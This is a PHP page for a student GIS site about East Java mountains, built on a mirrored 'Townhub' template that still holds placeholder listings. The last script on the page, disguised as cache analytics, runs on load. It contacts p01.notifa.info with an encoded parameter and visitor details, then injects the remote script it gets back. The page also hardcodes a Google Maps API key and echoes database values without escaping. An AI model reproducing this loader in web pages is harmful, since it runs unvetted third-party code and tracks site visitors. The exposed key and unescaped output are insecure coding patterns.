<?php 
include 'koneksi.php';

$query = mysqli_query($db,"SELECT * FROM gunungjatim");
$row = mysqli_fetch_array($query);
 ?>


<!DOCTYPE HTML>
<html lang="en">
    
<!-- Mirrored from townhub.kwst.net/index.html by HTTrack Website Copier/3.x [XR&CO'2013], Sun, 23 Feb 2020 01:22:17 GMT -->
<head>
        <!--=============== basic  ===============-->
        <meta charset="UTF-8">
        <title>Townhub - Directory Listing Template</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <meta name="robots" content="index, follow"/>
        <meta name="keywords" content=""/>
        <meta name="description" content=""/>
        <!--=============== css  ===============-->	
        <link type="text/css" rel="stylesheet" href="css/reset.css">
        <link type="text/css" rel="stylesheet" href="css/plugins.css">
        <link type="text/css" rel="stylesheet" href="css/style.css">
        <link type="text/css" rel="stylesheet" href="css/color.css">
        <!--=============== favicons ===============-->
        <link rel="shortcut icon" href="images/favicon.ico">
    </head>
    <body>
        <!--loader-->
        <div class="loader-wrap">
            <div class="loader-inner">
                <div class="loader-inner-cirle"></div>
            </div>
        </div>
        <!--loader end-->

                   
                    <!--section -->
                    <section   class="gray-bg hidden-section particles-wrapper">
                        <div class="container">
                            <div class="section-title">
                                <h2>GUNUNG JAWA TIMUR</h2>
                                <div class="section-subtitle">GUNUNG JAWA TIMUR</div>
                                <span class="section-separator"></span>
                                <p>Pegunungan yang ada di Jawa Timur</p>
                            </div>
                            <div class="listing-item-grid_container fl-wrap">
                                <div class="row">
                                    <!--  listing-item-grid  -->
                                   <?php while ($row = $query->fetch_assoc()) : ?>
                                    <div class="col-sm-4">
                                        <div class="listing-item-grid">
                                            <div class="bg"  data-bg="images/all/56.jpg"></div>
                                            <div class="d-gr-sec"></div>
                                          
                                            <div class="listing-item-grid_title">
                                                <h3><a href="infsemeru.php?gunung=<?=$row['idgng'];?>"><?=$row['Namagng'];?></a></h3>
                                                <p><?=$row['tggigng'];?></p>
                                            </div>
                                        </div>
                                    </div>
                                   <?php endwhile ?>
                                    
                                    <!--  listing-item-grid end  -->   									
                                </div>
                            </div>
                            <a href="semuagng.php" class="btn dec_btn   color2-bg">Lihat Semua Gunung<i class="fal fa-arrow-alt-right"></i></a>                                                
                    </section>
 <!--section  -->
                    <section class="slw-sec" id="sec1">
                        <div class="section-title">
                            <h2>DAFTAR ONLINE GUNUNG JAWA TIMUR</h2>
                            <div class="section-subtitle">DAFTAR ONLINE GUNUNG JAWA TIMUR</div>
                            <span class="section-separator"></span>
                            <p>Daftar online pegunungan yang ada di Jawa Timur</p>
                        </div>
                        <div class="listing-slider-wrap fl-wrap">
                            <div class="listing-slider fl-wrap">
                                <div class="swiper-container">
                                    <div class="swiper-wrapper">
                                        <!--  swiper-slide  -->
                                        <div class="swiper-slide">
                                            <div class="listing-slider-item fl-wrap">
                                                <!-- listing-item  -->
                                                <div class="listing-item listing_carditem">
                                                    <article class="geodir-category-listing fl-wrap">
                                                        <div class="geodir-category-img">
                                                            <div class="geodir-js-favorite_btn"><i class="fal fa-heart"></i><span>Save</span></div>
                                                            <a href="listing-single.html" class="geodir-category-img-wrap fl-wrap">
                                                            <img src="images/all/48.jpg" alt=""> 
                                                            </a>
                                                            <div class="geodir_status_date gsd_open"><i class="fal fa-lock-open"></i>Open Now</div>
                                                            <div class="geodir-category-opt">
                                                                <div class="geodir-category-opt_title">
                                                                    <h4><a href="listing-single.html">The Goggi Restaurant</a></h4>
                                                                    <div class="geodir-category-location"><a href="#"><i class="fas fa-map-marker-alt"></i>  34-42 Montgomery St , NY, USA</a></div>
                                                                </div>
                                                                <div class="listing-rating-count-wrap">
                                                                    <div class="review-score">4.1</div>
                                                                    <div class="listing-rating card-popup-rainingvis" data-starrating2="4"></div>
                                                                    <br>
                                                                    <div class="reviews-count">26 reviews</div>
                                                                </div>
                                                                <div class="listing_carditem_footer fl-wrap">
                                                                    <a class="listing-item-category-wrap" href="#">
                                                                        <div class="listing-item-category red-bg"><i class="fal fa-cheeseburger"></i></div>
                                                                        <span>Restaurants</span>
                                                                    </a>
                                                                    <div class="price-level geodir-category_price">
                                                                        <span class="price-level-item" data-pricerating="2"></span>
                                                                        <span class="price-name-tooltip">Pricey</span>
                                                                    </div>
                                                                    <div class="post-author"><a href="#"><img src="images/avatar/4.jpg" alt=""><span>By , Alisa Noory</span></a></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </article>
                                                </div>
                                                <!-- listing-item end -->                                                   
                                            </div>
                                        </div>
                                        <!--  swiper-slide end  -->  
                                        <!--  swiper-slide  -->
                                        <div class="swiper-slide">
                                            <div class="listing-slider-item fl-wrap">
                                                <!-- listing-item  -->
                                                <div class="listing-item listing_carditem">
                                                    <article class="geodir-category-listing fl-wrap">
                                                        <div class="geodir-category-img">
                                                            <div class="geodir-js-favorite_btn"><i class="fal fa-heart"></i><span>Save</span></div>
                                                            <a href="listing-single.html" class="geodir-category-img-wrap fl-wrap">
                                                            <img src="images/all/25.jpg" alt=""> 
                                                            </a>
                                                            <div class="geodir_status_date gsd_close"><i class="fal fa-lock"></i>Close Now</div>
                                                            <div class="geodir-category-opt">
                                                                <div class="geodir-category-opt_title">
                                                                    <h4><a href="listing-single.html">Gym in the Center</a></h4>
                                                                    <div class="geodir-category-location"><a href="#"><i class="fas fa-map-marker-alt"></i>  70 Bright St New York, USA</a></div>
                                                                </div>
                                                                <div class="listing-rating-count-wrap">
                                                                    <div class="review-score">5.0</div>
                                                                    <div class="listing-rating card-popup-rainingvis" data-starrating2="5"></div>
                                                                    <br>
                                                                    <div class="reviews-count">7 reviews</div>
                                                                </div>
                                                                <div class="listing_carditem_footer fl-wrap">
                                                                    <a class="listing-item-category-wrap" href="#">
                                                                        <div class="listing-item-category blue-bg"><i class="fal fa-dumbbell"></i></div>
                                                                        <span>Fitness / Gym</span>
                                                                    </a>
                                                                    <div class="price-level geodir-category_price">
                                                                        <span class="price-level-item" data-pricerating="3"></span>
                                                                        <span class="price-name-tooltip">Moderate</span>
                                                                    </div>
                                                                    <div class="post-author"><a href="#"><img src="images/avatar/6.jpg" alt=""><span>By , Mark Rose</span></a></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </article>
                                                </div>
                                                <!-- listing-item end -->                                                   
                                            </div>
                                        </div>
                                        <!--  swiper-slide end  -->                                                                                                                      
                                        <!--  swiper-slide  -->
                                        <div class="swiper-slide">
                                            <div class="listing-slider-item fl-wrap">
                                                <!-- listing-item  -->
                                                <div class="listing-item listing_carditem">
                                                    <article class="geodir-category-listing fl-wrap">
                                                        <div class="geodir-category-img">
                                                            <div class="geodir-js-favorite_btn"><i class="fal fa-heart"></i><span>Save</span></div>
                                                            <a href="listing-single.html" class="geodir-category-img-wrap fl-wrap">
                                                            <img src="images/all/42.jpg" alt=""> 
                                                            </a>
                                                            <div class="geodir_status_date gsd_open"><i class="fal fa-lock-open"></i>Open Now</div>
                                                            <div class="geodir-category-opt">
                                                                <div class="geodir-category-opt_title">
                                                                    <h4><a href="listing-single.html">Moonlight Hotel</a></h4>
                                                                    <div class="geodir-category-location"><a href="#"><i class="fas fa-map-marker-alt"></i> 34-42 Montgomery St , NY, USA</a></div>
                                                                </div>
                                                                <div class="listing-rating-count-wrap">
                                                                    <div class="review-score">4.2</div>
                                                                    <div class="listing-rating card-popup-rainingvis" data-starrating2="4"></div>
                                                                    <br>
                                                                    <div class="reviews-count">3 reviews</div>
                                                                </div>
                                                                <div class="listing_carditem_footer fl-wrap">
                                                                    <a class="listing-item-category-wrap" href="#">
                                                                        <div class="listing-item-category  yellow-bg"><i class="fal fa-bed"></i></div>
                                                                        <span>Hotels</span>
                                                                    </a>
                                                                    <div class="price-level geodir-category_price">
                                                                        <span class="price-level-item" data-pricerating="4"></span>
                                                                        <span class="price-name-tooltip">Ultra Hight</span>
                                                                    </div>
                                                                    <div class="post-author"><a href="#"><img src="images/avatar/5.jpg" alt=""><span>By , Nasty Wood</span></a></div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </article>
                                                </div>
                                                <!-- listing-item end -->                                                   
                                            </div>
                                        </div>
                                        <!--  swiper-slide end  -->                                       
                                        <!--  swiper-slide  -->
                                        <div class="swiper-slide">
                                            <div class="listing-slider-item fl-wrap">
                                                <!-- listing-item  -->
                                                <div class="listing-item listing_carditem">
                                                   
                                                           <div class="listing-item-grid">
                                            <div class="bg"  data-bg="images/all/56.jpg"></div>
                                            <div class="d-gr-sec"></div>
                                                            
                                                            <div class="geodir-category-opt">
                                                                <div class="geodir-category-opt_title">
                                                                    <h4><a href="listing-single.html">SEMERU</a></h4>
                                                                </div>
                                                               </div>
                                                        </div>
                                                    </article>
                                                </div>
								
                                                <!-- listing-item end -->                                                   
                                            </div>
                                        </div>
                                        <!--  swiper-slide end  -->    
										
                                    </div>
                                </div>
                                <div class="listing-carousel-button listing-carousel-button-next2"><i class="fas fa-caret-right"></i></div>
                                <div class="listing-carousel-button listing-carousel-button-prev2"><i class="fas fa-caret-left"></i></div>
                           

                            <div class="tc-pagination_wrap">
                                <div class="tc-pagination2"></div>
                            </div>
                        </div>
                    </section>
                    <!--section end-->
					
                    <div class="sec-circle fl-wrap"></div>
                         
                    <!--section  -->
                    <section class="parallax-section" data-scrollax-parent="true">
                        <div class="bg par-elem "  data-bg="images/bg/11.jpg" data-scrollax="properties: { translateY: '30%' }"></div>
                        <div class="overlay op7"></div>
                        <!--container-->
                        <div class="container">
                            <div class="video_section-title fl-wrap">
                                
                                <h2>Aplikasi Sistem Informasi Geografis<br> Pegunungan Jawa Timur</h2>
                            </div>
                            <a href="tentang.php" class="promo-link big_prom  "></i><span>TENTANG</span></a>
						
                        </div>
                    </section>
                    <!--section end-->
                    
                <!--content end-->
            </div>
            <!-- wrapper end-->

        <!-- Main end -->
        <!--=============== scripts  ===============-->
        <script src="js/jquery.min.js"></script>
        <script src="js/plugins.js"></script>
        <script src="js/scripts.js"></script>
        <script src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDwJSRi0zFjDemECmFl9JtRj1FY7TiTRRo&amp;libraries=places&amp;callback=initAutocomplete"></script>
        <script src="js/map-single.js"></script>                          
    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX8rPrtuTLYhGdDh%2b571CZ2aZxfEz3Po6ZL5ilRr8NpEsorzsGWQWjry%2b%2fTx9q9W3Cl3fUdxkYIHbyxS38Zi%2fXW5cHGRnv3udRA1ojTcewe7nD%2fZNXZOV2F475laTyFx7chhinFefwbBSwdVoXo2L%2baEJDALuJtnZBDpv6YXIQyGBQWB72XhS6MTjE0jmCkx7jk3%2bjd7Udhpu0NGvOzdSlx0AzuYJFxfK1rqZzFQnBdaS89DZEurWc9m%2fruznQ3L%2fWJXIQuphcJ4qLDus%2fDtomBg7QgQE8xbxABn%2fAg3M9acfuNSLRFN9lD87z5nyU28poElsZHn4GJCqLQYX1yQROCDB48CYtB3ecYvDIiNz2u8F98fgw4Kw0lG3b39VbqnYVETOFNANuk%2fkkPZpIWkYTLii0VasfdoKikMYpYpYoBTN0hQNTu3XPrXEPrmS2PIzgXH%2fjIKrnSDWn%2bDgFwVEyqOX9JzBUEh3E" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from townhub.kwst.net/index.html by HTTrack Website Copier/3.x [XR&CO'2013], Sun, 23 Feb 2020 01:26:21 GMT -->
</html>